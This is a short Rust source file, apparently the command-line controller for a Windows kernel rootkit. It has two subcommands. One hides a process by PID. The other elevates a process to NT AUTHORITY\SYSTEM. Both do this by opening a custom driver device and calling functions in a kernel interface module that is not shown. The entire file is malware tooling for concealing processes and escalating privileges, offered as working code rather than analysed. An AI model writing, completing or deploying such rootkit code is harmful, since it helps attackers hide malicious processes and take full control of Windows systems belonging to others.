use clap::{Parser, Subcommand};

use windows::core::w;
mod constants;

mod kernel_interface;
use kernel_interface::{hide_process, contact_driver, elevate_process};

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {

    #[command(subcommand)]
    cmd: Commands,

}

#[derive(Subcommand, Debug, Clone)]
enum Commands {

    Hide {
        #[arg(short, long, help = "PID of the process to hide", required = true)]
        process: u32,
    },

    Privesc {
        #[arg(short, long, help = "PID of the process to elevate to NT AUTHORITY\\SYSTEM", required = true)]
        process: u32,
    },

}

fn main() {
    let args = Args::parse();

    match args.cmd {

        Commands::Hide { process } => {
            println!("Hiding process PID: {:?}", process);
            unsafe {
                let driver_handle = contact_driver("\\\\.\\MyDevice");
                hide_process(driver_handle, process);
            }
        }

        Commands::Privesc { process } => {
            println!("Elevate Process PID: {}", process);
            unsafe {
                let driver_handle = contact_driver("\\\\.\\MyDevice");
                elevate_process(driver_handle, process);
            }
        }

    }
}